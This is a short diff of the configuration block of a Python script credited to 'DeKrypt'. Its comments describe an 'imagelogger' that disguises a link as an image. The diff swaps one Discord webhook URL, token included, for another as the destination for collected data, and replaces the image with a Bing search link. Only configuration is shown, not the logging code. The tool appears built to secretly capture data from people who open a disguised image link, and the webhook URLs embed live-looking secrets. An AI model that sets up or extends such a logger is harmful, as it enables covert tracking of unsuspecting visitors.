@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1268803749216784478/cCxxpFj8pyeJxPrVyT43WwWONRqtcbHXWx44pMEydugOYm8U3iwSno1WfMD80IcwsfEj",
-    "image": "https://discord.com/api/webhooks/1279502523144867951/-jRmlTVt_peMv93eIrvXIIRotQC63n2BF7s5d06__TsIGVcmpgylMi-p6a8A1h88C9nP", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1279502523144867951/-jRmlTVt_peMv93eIrvXIIRotQC63n2BF7s5d06__TsIGVcmpgylMi-p6a8A1h88C9nP",
+    "image": "https://www.bing.com/images/search?view=detailV2&ccid=5%2fRtLfTs&id=004E2B74951C3D022D5D446AF107A203B5B26142&thid=OIP.5_RtLfTs1XW-oDsdrd1a2gHaEK&mediaurl=https%3a%2f%2fimages.hdqwalls.com%2fwallpapers%2fwater-through-rocks-4k-kl.jpg&cdnurl=https%3a%2f%2fth.bing.com%2fth%2fid%2fR.e7f46d2df4ecd575bea03b1daddd5ada%3frik%3dQmGytQOiB%252fFqRA%26pid%3dImgRaw%26r%3d0&exph=2160&expw=3840&q=image&simid=608001386664061222&FORM=IRPRST&ck=ACE090E09284E30D1F487580B706B869&selectedIndex=2&itb=0&qpvt=image", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
